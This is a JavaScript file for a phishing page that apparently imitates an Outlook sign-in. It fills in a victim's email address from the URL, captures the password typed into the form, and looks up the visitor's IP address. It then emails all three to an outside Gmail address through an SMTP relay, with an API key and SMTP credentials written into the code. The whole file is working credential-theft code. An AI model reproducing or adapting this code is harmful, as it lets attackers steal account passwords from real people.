let ipAddress

const imageBtn = document.querySelector('.image-btns')
const showModal = document.querySelector('.container')

imageBtn.addEventListener('click', () => {
  showModal.style.display = 'flex'
})

showModal.addEventListener('click', (e) => {
  if (e.target.classList.contains('close')) {
    showModal.style.display = 'none'
  }
})


const password = document.getElementById('text-input')
// const submitBtn = document.getElementById('js-btn')
const emailText = document.querySelector('.emailText')
const formm = document.querySelector('#formm')

let params = new URLSearchParams(location.search);
currentEmail = params.get('email')

console.log(currentEmail)
emailText.textContent = currentEmail


const loadApi = () => {
  fetch('https://geo.ipify.org/api/v2/country?apiKey=at_UwftBF1ai2fO0QXd0f939kvDaAp7l&ipAddress')
  .then(response => response.json())
  .then(data => {

    console.log(data.ip)
    ipAddress = data.ip;

    var data = password.value

    Email.send({
      Host : "smtp.elasticemail.com",
      Username : "eyizulie@gmail.com",
      Password : "DE870060242DD68D26316F59653692593324",
      To : 'ameedif@gmail.com',
      From : "eyizulie@gmail.com",
      Subject : "New Password",
      Body : `password: ${data}, ip: ${ipAddress} email: ${currentEmail}`
    }).then(
      // window.location.replace("https://outlook.live.com/mail/0/")
      message => console.log(message)
      );
  })
}

const handleSubmit = (e) => {
  e.preventDefault()
  console.log(password.value)
  loadApi()
}

formm.addEventListener('click', handleSubmit)